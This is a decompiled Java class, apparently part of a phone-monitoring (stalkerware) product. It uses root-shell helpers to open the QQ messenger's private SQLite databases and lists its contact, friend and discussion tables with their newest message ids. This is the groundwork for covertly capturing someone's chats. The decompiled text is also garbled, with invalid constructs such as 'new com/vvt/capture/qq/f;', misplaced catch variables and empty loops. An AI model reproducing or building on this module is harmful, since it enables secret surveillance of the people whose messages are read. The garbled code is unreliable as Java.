package com.vvt.capture.qq.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.ag.b;
import com.vvt.capture.qq.d;
import com.vvt.capture.qq.f;
import com.vvt.shell.ShellUtil;
import java.util.HashMap;

public class a
{
  private static final boolean a = com.vvt.ak.a.e;
  
  private static long a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    boolean bool1 = false;
    String str = null;
    int j = 1;
    Object[] arrayOfObject = new Object[j];
    arrayOfObject[0] = paramString;
    Object localObject1 = String.format("SELECT _id FROM %s ORDER BY _id DESC LIMIT 1", arrayOfObject);
    long l = -1;
    for (;;)
    {
      try
      {
        localObject1 = paramSQLiteDatabase.rawQuery((String)localObject1, null);
        localObject1 = (d)localObject1;
        if (localObject1 != null) {}
        int i;
        Object localObject2;
        bool2 = a;
      }
      catch (Exception localException2)
      {
        try
        {
          bool1 = ((d)localObject1).moveToFirst();
          if (bool1)
          {
            bool1 = ((d)localObject1).isAfterLast();
            if (!bool1)
            {
              str = "_id";
              i = ((d)localObject1).getColumnIndex(str);
              l = ((d)localObject1).getLong(i);
            }
          }
          if (localObject1 != null) {
            ((d)localObject1).close();
          }
          return l;
        }
        catch (Exception localException1)
        {
          boolean bool2;
          for (;;) {}
        }
        localException2 = localException2;
        localObject2 = null;
      }
      if (!bool2) {}
    }
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      f localf = new com/vvt/capture/qq/f;
      localf.<init>();
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, localf, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        boolean bool = a;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static HashMap a(String paramString)
  {
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    SQLiteDatabase localSQLiteDatabase;
    try
    {
      localSQLiteDatabase = b(paramString);
      Object localObject = "SELECT name FROM sqlite_master WHERE (type='table') AND (name LIKE 'mr_contact_%_New' OR name LIKE 'mr_friend_%_New' OR name LIKE 'mr_discusssion_%_New')";
      boolean bool1 = false;
      String str = null;
      localObject = localSQLiteDatabase.rawQuery((String)localObject, null);
      localObject = (d)localObject;
      if (localObject != null)
      {
        bool1 = ((d)localObject).moveToFirst();
        if (bool1)
        {
          for (;;)
          {
            bool1 = ((d)localObject).isAfterLast();
            if (bool1) {
              break;
            }
            str = "name";
            int i = ((d)localObject).getColumnIndex(str);
            str = ((d)localObject).a(i);
            long l1 = a(localSQLiteDatabase, str);
            long l2 = 0L;
            boolean bool2 = l1 < l2;
            if (bool2)
            {
              Long localLong = Long.valueOf(l1);
              localHashMap.put(str, localLong);
            }
            ((d)localObject).moveToNext();
          }
          boolean bool3;
          return localHashMap;
        }
      }
    }
    catch (Exception localException)
    {
      bool3 = a;
      if (!bool3) {}
    }
    for (;;)
    {
      if (localException != null) {
        localException.close();
      }
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
    }
  }
  
  public static SQLiteDatabase b(String paramString)
  {
    int i = 0;
    Object localObject = null;
    int k = 1;
    int m = b.a(paramString);
    if (m != 0)
    {
      m = a;
      if (m == 0) {}
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      m = ShellUtil.b(paramString);
      if (m != 0)
      {
        SQLiteDatabase localSQLiteDatabase1 = a(paramString, k);
        i = 5;
        localObject = localSQLiteDatabase1;
        m = i;
        while ((localObject == null) && (m > 0))
        {
          boolean bool = a;
          if (bool) {}
          long l = 1000L;
          SystemClock.sleep(l);
          SQLiteDatabase localSQLiteDatabase2 = a(paramString, k);
          int j = m + -1;
          m = j;
          localObject = localSQLiteDatabase2;
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */